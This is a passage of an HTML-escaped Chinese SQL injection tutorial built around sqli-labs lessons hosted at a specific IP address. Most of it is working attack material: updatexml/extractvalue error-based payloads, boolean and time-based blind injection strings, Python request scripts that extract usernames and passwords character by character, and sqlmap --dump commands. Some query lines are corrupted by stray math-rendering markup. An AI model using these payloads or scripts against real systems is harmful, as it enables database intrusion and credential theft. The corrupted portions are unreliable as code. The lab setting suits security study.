class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;email’,‘add’)&amp;quot;;&lt;/li&gt;
&lt;li&gt;步骤&lt;br&gt;
 (1) 爆库&lt;br&gt;
 1’ and updatexml (1,concat (0x7e,(select database ()),0x7e),1) #&lt;br&gt;
1’ and extractvalue(1,concat(0x7e,database(),0x7e)) #&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;query=&#34;insert into member(username,pw,sex,phonenum,email,address) values(&#39;1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)  #&#39;,&#39;password’,‘&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;sex&amp;#x27;,&amp;#x27;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.946332em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;phonenum’,’$email’,‘add’)&amp;quot;;&lt;/p&gt;
&lt;p&gt;query=&#34;insert into member(username,pw,sex,phonenum,email,address) values(&#39;1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)  
and&#39; &#39;,&#39;password’,‘&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;sex&amp;#x27;,&amp;#x27;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.946332em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;phonenum’,’$email’,‘add’)&amp;quot;;&lt;br&gt;
(2) 爆表&lt;br&gt;
 1’ and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ()),0x7e),1) #&lt;br&gt;
1’ and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=‘数据库名’),0x7e),1) #&lt;br&gt;
1’ and updatexml (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=‘数据库名’ limit 0,1),0x7e),1) #&lt;/p&gt;
&lt;p&gt;1’ and extractvalue (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=‘数据库名’),0x7e)) #&lt;br&gt;
1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #&lt;br&gt;
1’ and extractvalue (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=‘数据库名’ limit 0,1),0x7e)) #&lt;br&gt;
(3) 爆列&lt;br&gt;
 1’ and updatexml (1,concat (0x7e,(select group_concat (column_name) from information_schema.columns where table_schema=database ()),0x7e),1) #&lt;br&gt;
1’ and updatexml (1,concat (0x7e,(select group_concat (column_name) from information_schema.columns where table_name=‘表名’),0x7e),1) #&lt;br&gt;
1’ and updatexml (1,concat (0x7e,(select column_name from information_schema.columns where table_name=‘表名’ limit 0,1),0x7e),1) #&lt;/p&gt;
&lt;p&gt;1’ and extractvalue (1,concat (0x7e,(select group_concat (column_name) from information_schema.columns where table_name=‘表名’),0x7e)) #&lt;br&gt;
1’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e))#&lt;br&gt;
1’ and extractvalue (1,concat (0x7e,(select column_name from information_schema.columns where table_name=‘表名’ limit 0,1),0x7e))#&lt;br&gt;
(4) 爆值&lt;br&gt;
 1’ and updatexml (1,concat (0x7e,(select group_concat (表名对应的字段名) from (数据库。表名)),0x7e),1) #&lt;/p&gt;
&lt;p&gt;1’ and extractvalue (1,concat (0x7e,(select group_concat (表名对应的字段名) from (数据库。表名)),0x7e)) #&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;各种报错注入&#34;&gt; 各种报错注入&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;概念&lt;br&gt;
 insert /update 注入是指我们前端注册的信息，后台会通过 insert/update 这个操作插入 / 更新到数据库中。如果后台没对我们的输入做防 SQL 注入处理，我们就能在注册时通过拼接 SQL 注入。&lt;br&gt;
1、insert 注入：注册的信息，没有经过过滤直接带到数据库中，导致 insert 注入。&lt;br&gt;
2、update 注入：用户登陆端，没有经过过滤直接带到数据库中，导致 update 注入。&lt;br&gt;
3、dalete 注入：应用于前后端发贴、留言、用户等相关删除操作时抓包。&lt;br&gt;
4、Http Header 注入：数据库直接获取了前端的头信息没有做任何的处理导致注入。&lt;br&gt;
5、Cookie 注入：后端获取 Cookie 直接在数据库中进行拼接，那这也是一个 SQL 注入点。&lt;br&gt;
注入方法 ：在 ant [uname]=admin 后添加一个’观察反馈的 MYSQL 的语法报错，发现了存在 SQL 注入漏洞后，再插入 payload： &#39;and updatexml (1,concat (0x7e,database ()),0)#&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;布尔盲注&#34;&gt; 布尔盲注&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;概念&lt;br&gt;
手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答 “是” 或者 “是”，因此你需要询问它这样的问题，例如 “数据库名字的第一个字母是不是 a 啊？” 通过这种机械的询问，最终获得你想要的数据。&lt;/li&gt;
&lt;li&gt;利用情景&lt;br&gt;
页面上没有显示位，并且没有输出 SQL 语句执行错误信息&lt;br&gt;
只能通过页面返回正常与不正常判断&lt;/li&gt;
&lt;li&gt;步骤&lt;br&gt;
 1. 判断是否存在注入，注入是字符型还是数字型&lt;br&gt;
 2. 猜解当前数据库名&lt;br&gt;
 3. 猜解数据库中的表名&lt;br&gt;
 4. 猜解表中的字段名&lt;br&gt;
 5. 猜解数据&lt;/li&gt;
&lt;li&gt;盲注常用函数
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;函数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;left (字符串，截取长度)&lt;/td&gt;
&lt;td&gt;从左边截取指定长度的字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;length (字符串)&lt;/td&gt;
&lt;td&gt;获取字符串的长度&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ascii (字符串)&lt;/td&gt;
&lt;td&gt;将指定字符串进行 ascii 编码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;substr (字符串，start，截取长度)&lt;/td&gt;
&lt;td&gt;截取字符串，可以指定起始位置和长度&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mid (字符串，start，截取长度)&lt;/td&gt;
&lt;td&gt;截取字符串，可以指定起始位置和长度&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;count()&lt;/td&gt;
&lt;td&gt;计算总数，返回匹配条件的行数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sleep(n)&lt;/td&gt;
&lt;td&gt;将程序挂起 n 秒&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;if (参数 1，参数 2，参数 3)&lt;/td&gt;
&lt;td&gt;参数 1 为条件，当参数 1 返回的结果为 true 时，执行参数 2，否则执行参数 3&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;手工实现布尔盲注&#34;&gt; 手工实现布尔盲注&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;判断是数字型还是字符型&lt;/li&gt;
&lt;li&gt;猜解数据库长度&lt;br&gt;
使用 length () 判断数据库长度，二分法可提高效率&lt;br&gt;
？id=1’ and length (database ())&amp;gt;5 --+&lt;br&gt;
?id=1’ and length(database())&amp;lt;10 --+&lt;br&gt;
?id=1’ and length(database())=8 --+&lt;br&gt;
【length=8】&lt;/li&gt;
&lt;li&gt;猜当前数据库名&lt;br&gt;
方法 1：使用 substr 函数&lt;br&gt;
？id=1’ and substr (database (),1,1)&amp;gt;‘r’–+&lt;br&gt;
?id=1’ and substr(database(),1,1)&amp;lt;‘t’–+&lt;br&gt;
?id=1’ and substr(database(),1,1)=‘s’–+&lt;br&gt;
?id=1’ and substr(database(),2,1)=‘e’–+&lt;br&gt;
…&lt;br&gt;
?id=1’ and substr(database(),8,1)=‘y’–+&lt;br&gt;
【security】&lt;br&gt;
方法 2：使用 ascii 函数和 substr 函数&lt;br&gt;
？id=1’ and ascii (substr (database (),1,1))&amp;gt;114 --+&lt;br&gt;
?id=1’ and ascii(substr(database(),1,1))&amp;lt;116 --+&lt;br&gt;
?id=1’ and ascii(substr(database(),1,1))=115 --+&lt;br&gt;
【security】&lt;br&gt;
方法 3：使用 left 函数&lt;br&gt;
？id=1’ and left (database (),1)&amp;gt;‘r’–+&lt;br&gt;
?id=1’ and left(database(),1)&amp;lt;‘t’–+&lt;br&gt;
?id=1’ and left(database(),1)=‘s’ --+&lt;br&gt;
?id=1’ and left(database(),2)=‘se’ --+&lt;br&gt;
?id=1’ and left(database(),3)=‘sec’ --+&lt;br&gt;
…&lt;br&gt;
?id=1’ and left(database(),8)=‘security’ --+&lt;br&gt;
【security】&lt;br&gt;
方法 4：使用 Burpsuite 的 Intruder 模块&lt;br&gt;
将获取数据库第一个字符的请求包拦截并发送到 Intruder 模块&lt;br&gt;
设置攻击变量以及攻击类型&lt;br&gt;
设置第一个攻击变量，这个变量是控制第几个字符的&lt;br&gt;
设置第二个攻击变量，这个变量是数据库名字符&lt;br&gt;
开始攻击，一小会就能得到测试结果，通过对长度和变量进行排序可以看到数据库名成功得到&lt;/li&gt;
&lt;li&gt;判断表的个数&lt;br&gt;
 count () 函数是用来统计表中记录的一个函数，返回匹配条件的行数。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;?id=1’ and (select count(table_name) from information_schema.tables where table_schema=database())&amp;gt;0 --+&lt;br&gt;
?id=1’ and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+&lt;br&gt;
【4 个表】&lt;br&gt;
5. 判断表的长度&lt;br&gt;
 limit 可以被用于强制 select 语句返回指定的条数。&lt;/p&gt;
&lt;p&gt;?id=1’ and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+&lt;br&gt;
【第一个表长度为 6】&lt;br&gt;
?id=1’ and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8 --+&lt;br&gt;
【第二个表长度为 8】&lt;br&gt;
6. 猜解表名&lt;br&gt;
方法 1：使用 substr 函数&lt;br&gt;
？id=1’ and substr ((select table_name from information_schema.tables where table_schema=database () limit 0,1),1,1)&amp;gt;‘d’ --+&lt;br&gt;
?id=1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&amp;gt;‘f’ --+&lt;br&gt;
?id=1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=‘e’ --+&lt;br&gt;
…&lt;br&gt;
?id=1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)=‘s’ --+&lt;br&gt;
【第一个表名为 emails】&lt;br&gt;
方法 2：使用 Burpsuite 的 Intruder 模块&lt;br&gt;
 7. 猜解字段名和字段信息&lt;br&gt;
 #确定字段个数&lt;br&gt;
？id=1’ and (select count (column_name) from information_schema.columns where table_schema=database () and table_name = ‘users’)&amp;gt;0 --+&lt;br&gt;
?id=1’ and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = ‘users’)=3 --+&lt;br&gt;
【字段个数为 3】&lt;br&gt;
# 确定字段名的长度&lt;br&gt;
？id=1’ and length ((select column_name from information_schema.columns where table_schema=database () and table_name = ‘users’ limit 0,1))&amp;gt;0 --+&lt;br&gt;
?id=1’ and length((select column_name from information_schema.columns where table_schema=database() and table_name = ‘users’ limit 0,1))=2 --+&lt;br&gt;
?id=1’ and length((select column_name from information_schema.columns where table_schema=database() and table_name = ‘users’ limit 1,1))=8 --+&lt;br&gt;
【第一个字段长度为 2，第二个字段长度为 8】&lt;br&gt;
# 猜字段名 同上使用 burp ?i&lt;br&gt;
d=1’ and substr((select column_name from information_schema.columns where table_schema=database() and table_name = ‘users’ limit 0,1),1,1)=‘i’ --+   【…id,username,password…】&lt;br&gt;
# 确定字段数据长度&lt;br&gt;
？id=1’ and length ((select username from users limit 0,1))=4 --+&lt;br&gt;
【第一个字段数据长度为 4】&lt;br&gt;
# 猜解字段数据 同上使用 burp&lt;br&gt;
?id=1’ and substr((select username from users limit 0,1),1,1)=‘d’ --+&lt;br&gt;
?id=1’ and ascii(substr((select username from users limit 0,1),1,1))&amp;gt;79 --+&lt;br&gt;
【第一个 username 数据为 dumb】&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;sqlmap-实现布尔盲注&#34;&gt; SqlMap 实现布尔盲注&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;–batch: 用此参数，不需要用户输入，将会使用 sqlmap 提示的默认值一直运行下去。&lt;br&gt;
–technique: 选择注入技术，B:Boolean-based-blind  （布尔型盲注）&lt;br&gt;
–threads 10 : 设置线程为 10，运行速度会更快&lt;br&gt;
 #查询数据库 #【security】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/?id=1&lt;/a&gt;” --dbs --batch --threads 10&lt;br&gt;
# 获取数据库中的表 #【emails、referers、uagents、users】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/?id=1&lt;/a&gt;” -D security --tables --batch --threads 10&lt;br&gt;
# 获取表中的字段名 #【id、username、password】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/?id=1&lt;/a&gt;” -D security -T users --columns --batch --threads 10&lt;br&gt;
# 获取字段信息 #【Dumb|Dumb、dhakkan|dumbo …】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/?id=1&lt;/a&gt;” -D security -T users -C username,password --dump --batch --threads 10&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;脚本实现布尔盲注&#34;&gt; 脚本实现布尔盲注&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;获取数据库名长度&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
# 获取数据库名长度&lt;br&gt;
 def database_len ():&lt;br&gt;
for i in range(1, 10):&lt;br&gt;
url = ‘’‘&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/&lt;/a&gt;’’’&lt;br&gt;
payload = ‘’’?id=1’ and length(database())=%d’’’ %i&lt;br&gt;
r = requests.get(url + payload + ‘%23’) # %23 &amp;lt;==&amp;gt; --+&lt;br&gt;
if ‘You are in’ in r.text:&lt;br&gt;
print(‘database_length:’, i)&lt;br&gt;
break&lt;br&gt;
else:&lt;br&gt;
print(i)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;database_len()&lt;br&gt;
【database_length: 8】&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;获取数据库名&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
# 获取数据库名&lt;br&gt;
 def database_name ():&lt;br&gt;
name = ‘’&lt;br&gt;
for j in range(1,9):&lt;br&gt;
for i in ‘0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_’:&lt;br&gt;
url = “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/&lt;/a&gt;”&lt;br&gt;
payload = “?id=1’ and substr(database(),%d,1)=’%s’ --+”  %(j, i)&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
if ‘You are in’ in r.text:&lt;br&gt;
name = name + i&lt;br&gt;
print(name)&lt;br&gt;
break&lt;br&gt;
print(‘database_name:’, name)&lt;br&gt;
database_name()&lt;br&gt;
#【database_name: security】&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取数据库中表&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
# 获取数据库表&lt;br&gt;
 def tables_name ():&lt;br&gt;
name = ‘’&lt;br&gt;
for j in range(1, 30):&lt;br&gt;
for i in ‘abcdefghijklmnopqrstuvwxyz,’:&lt;br&gt;
url = “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/&lt;/a&gt;”&lt;br&gt;
payload = ‘’’?id=1’ and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=’%s’ --+’’’ % (j, i)&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
if ‘You are in’ in r.text:&lt;br&gt;
name = name + i&lt;br&gt;
print(name)&lt;br&gt;
break&lt;br&gt;
print(‘table_name:’, name)&lt;br&gt;
tables_name()&lt;br&gt;
#【table_name: emails,referers,uagents,users】&lt;br&gt;
4. 获取表中字段&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
# 获取表中字段&lt;br&gt;
 def columns_name ():&lt;br&gt;
name = ‘’&lt;br&gt;
for j in range(1, 30):&lt;br&gt;
for i in ‘abcdefghijklmnopqrstuvwxyz,’:&lt;br&gt;
url = “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/&lt;/a&gt;”&lt;br&gt;
payload = “?id=1’ and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘users’),%d,1)=’%s’ --+” %(j, i)&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
if ‘You are in’ in r.text:&lt;br&gt;
name = name + i&lt;br&gt;
print(name)&lt;br&gt;
break&lt;br&gt;
print(‘column_name:’, name)&lt;br&gt;
columns_name()&lt;br&gt;
#【column_name: id,username,password】&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取字段值&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
# 获取字段值&lt;br&gt;
 def value ():&lt;br&gt;
name = ‘’&lt;br&gt;
for j in range(1, 100):&lt;br&gt;
for i in ‘0123456789abcdefghijklmnopqrstuvwxyz,_-’:&lt;br&gt;
url = “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/&lt;/a&gt;”&lt;br&gt;
payload = “?id=1’ and substr((select group_concat(username,password) from users),%d,1)=’%s’ --+” %(j, i)&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
if ‘You are in’ in r.text:&lt;br&gt;
name = name + i&lt;br&gt;
print(name)&lt;br&gt;
break&lt;br&gt;
print(‘value:’, name)&lt;br&gt;
value()&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;时间盲注&#34;&gt; 时间盲注&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;利用情景&lt;br&gt;
页面上没有显示位&lt;br&gt;
没有输出报错语句&lt;br&gt;
正确的 sql 语句和错误的 sql 语句页面返回一致&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;手工实现时间盲注&#34;&gt; 手工实现时间盲注&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;?id=1&lt;br&gt;
?id=1’&lt;br&gt;
?id=1&amp;quot;&lt;br&gt;
# 不管怎么样都不报错，不管对错一直显示一个固定的页面；&lt;/p&gt;
&lt;p&gt;#判断注入点&lt;br&gt;
？id=1’ and sleep (3)–+&lt;br&gt;
# 页面响应延迟，判断存在时间延迟型注入&lt;/p&gt;
&lt;p&gt;#获取数据库名长度&lt;br&gt;
？id=1’ and if (length (database ())=8,sleep (3),1)–+&lt;/p&gt;
&lt;p&gt;#获取数据库名&lt;br&gt;
？id=1’ and if (substr (database (),1,1)=‘s’,sleep (3),1)–+&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;结合-burpsuite-的-intruder-模块爆破数据库名&#34;&gt; 结合 Burpsuite 的 Intruder 模块爆破数据库名&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;将获取数据库第一个字符的请求包拦截并发送到 Intruder 模块&lt;br&gt;
设置攻击变量以及攻击类型&lt;br&gt;
设置第一个攻击变量，这个变量是控制第几个字符的&lt;br&gt;
设置第二个攻击变量，这个变量是数据库名字符&lt;br&gt;
开始攻击，一小会就能得到测试结果，通过对长度和变量进行排序可以看到数据库名成功得到&lt;br&gt;
 image-20200515211534056&lt;br&gt;
image-20200515211534056&lt;br&gt;
 获取表名、字段名、字段信息等数据方法同上&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;sqlmap-实现时间盲注&#34;&gt; SQLmap 实现时间盲注&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;–batch: 用此参数，不需要用户输入，将会使用 sqlmap 提示的默认值一直运行下去。&lt;br&gt;
–technique: 选择注入技术，-T:Time-based blind  （基于时间延迟注入）&lt;br&gt;
–threads 10 : 设置线程为 10，运行速度会更快。&lt;br&gt;
# 查询数据库 #【security】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/?id=1&lt;/a&gt;” --dbs --batch --threads 10&lt;br&gt;
# 获取数据库中的表 #【emails、referers、uagents、users】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/?id=1&lt;/a&gt;” -D security --tables --batch --threads 10&lt;br&gt;
# 获取表中的字段名 #【id、username、password】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/?id=1&lt;/a&gt;” -D security -T users --columns --batch --threads 10&lt;br&gt;
# 获取字段信息 #【Dumb|Dumb、dhakkan|dumbo …】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/?id=1&lt;/a&gt;” -D security -T users -C username,password --dump --batch --threads 10&lt;/p&gt;
